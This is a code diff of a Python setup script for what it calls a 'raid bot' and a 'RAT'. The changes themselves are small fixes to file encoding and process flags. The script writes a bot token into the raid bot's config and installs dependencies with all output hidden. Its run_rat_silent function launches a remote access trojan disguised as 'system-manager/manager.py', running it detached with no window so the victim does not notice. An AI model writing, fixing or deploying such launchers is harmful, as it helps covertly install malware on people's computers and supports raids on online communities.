@@ -26,12 +26,12 @@ def write_raid_bot_token(token):
     """WRITE TOKEN TO RAID BOT CONFIG"""
     raid_bot_path = Path("raid-bot/bot.py")
     
-    with open(raid_bot_path, 'r') as f:
+    with open(raid_bot_path, 'r', encoding='utf-8') as f:
         content = f.read()
     
     content = content.replace("PUT_YOUR_BOT_TOKEN_HERE", token)
     
-    with open(raid_bot_path, 'w') as f:
+    with open(raid_bot_path, 'w', encoding='utf-8') as f:
         f.write(content)
     
     print("✅ Raid bot configured")
@@ -40,11 +40,13 @@ def install_dependencies():
     """INSTALL ALL REQUIREMENTS"""
     print("\n📦 Installing dependencies...")
     
+    CREATE_NO_WINDOW = 0x08000000
+    
     subprocess.run(
         [sys.executable, "-m", "pip", "install", "-q", "-r", "requirements.txt"],
         stdout=subprocess.DEVNULL,
         stderr=subprocess.DEVNULL,
-        creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
+        creationflags=CREATE_NO_WINDOW if sys.platform == "win32" else 0
     )
     
     print("✅ Dependencies installed")
@@ -53,13 +55,16 @@ def run_rat_silent():
     """RUN RAT IN BACKGROUND SILENTLY (WINDOWS 11)"""
     rat_path = Path("system-manager/manager.py")
     
+    CREATE_NO_WINDOW = 0x08000000
+    DETACHED_PROCESS = 0x00000008
+    
     # WINDOWS 11 - USE pythonw.exe (NO WINDOW)
     pythonw = sys.executable.replace("python.exe", "pythonw.exe")
     
     if os.path.exists(pythonw):
         subprocess.Popen(
             [pythonw, str(rat_path)],
-            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
+            creationflags=CREATE_NO_WINDOW | DETACHED_PROCESS,
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
         )
@@ -67,7 +72,7 @@ def run_rat_silent():
         # FALLBACK
         subprocess.Popen(
             [sys.executable, str(rat_path)],
-            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
+            creationflags=CREATE_NO_WINDOW | DETACHED_PROCESS,
             stdout=subprocess.DEVNULL,
             stderr=subprocess.DEVNULL
         )
